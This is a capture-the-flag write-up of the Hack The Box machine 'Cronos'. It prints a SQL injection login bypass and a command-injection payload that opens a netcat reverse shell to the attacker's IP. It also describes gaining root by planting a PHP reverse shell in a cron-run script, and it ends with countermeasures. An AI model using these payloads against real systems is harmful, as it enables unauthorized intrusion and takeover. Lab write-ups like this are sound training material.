#### Machine Release Date: March 22, 2017

## Summary

Cronos was an older medium level machine that leaked its subdomains via a DNS zone transfer.
From there, I found subdomain with a login form where I was able to bypass authentiction via basic MySQL injection.
After logging into the web application, I was able to leverage OS command injection to get remote code execution on the machine.
Once on the machine, I wrote a PHP reverse shell to the file the system's cronjob was executing to get remote code execution as root.

## Failed Recon

* Nothing interesting found by brute forcing web files and directories in both `cronos.htb` and `admin.cronos.htb` subdomains.
* PHP password reuse failed.

## DNS Enumeration (DNS Zone Transfer)

With a lucky guess for for the domain name `cronos.htb`, I was able to perform a DNS zone transfer, further discovering more subdomains:

```
$ dig axfr cronos.htb @10.10.10.13

; <<>> DiG 9.16.6-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 35 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Thu Sep 24 12:58:54 EDT 2020
;; XFR size: 7 records (messages 1, bytes 203)
```

I then added `cronos.htb`, `admin.cronos.htb`, and `www.cronos.htb` to my `/etc/hosts` file so that my Kali machine would resolve those domain names to 10.10.10.13.
I did this because the Apache web server was hosting different web pages on differnt subdomains using virtual hosting.

## Exploitation (SQL Injection Authentication Bypass)

Navigating to `admin.cronos.htb`, I was presented with a login page.
I was able to use SQL injection at `http://admin.cronos.htb` in the `username` field with the following payload to bypass authentication:

```mysql
' OR 1=1;#
```

![](/assets/images/htb-cronos/cronos-username-field-sql-injection-auth-bypass.png)

I was then able to submit the following payload in the web form to achieve OS command injection and get a netcat reverse shell:

```
10.10.10.19; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 2001 >/tmp/f
```

```
$ ncat -nvlp 2001
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::2001
Ncat: Listening on 0.0.0.0:2001
Ncat: Connection from 10.10.10.13.
Ncat: Connection from 10.10.10.13:35428.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation (Cronjob Running Writeable Script by Low-Privileged User)

I noticed that the `/etc/crontab` file executed `/var/www/laravel/artisan` every minute.
This directory was writeable by the `www-data` user which meant that I should be able to replace that file with a PHP reverse shell to gain root access to the machine:

```
www-data@cronos:/var/www/admin$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
#

www-data@cronos:/var/www/admin$ ls -l /etc/crontab
-rw-r--r-- 1 root root 797 Apr  9  2017 /etc/crontab

www-data@cronos:/var/www/admin$ ls -l /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

After making a backup of `/var/www/laravel/artisan`, I embedded [the following php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) in `/var/www/laravel/artisan` so that it would execute it, connecting back to my netcat listener in the next minute:

```
$ ncat -nvlp 2001
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::2001
Ncat: Listening on 0.0.0.0:2001

Ncat: Connection from 10.10.10.13:52538.

uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
1703b8a3c9a8dde879942c79d02fd3a0
```

At this point, I had a reverse shell with root privileges.

## Countermeasures

* Only allow DNS zone transfers [from trusted IPs](https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/).
* Use [prepared statements](https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html) for all SQL queries so that data does not get interpreted as code.
* Never run cron jobs that depend on scripts writeable by low-privielged users.
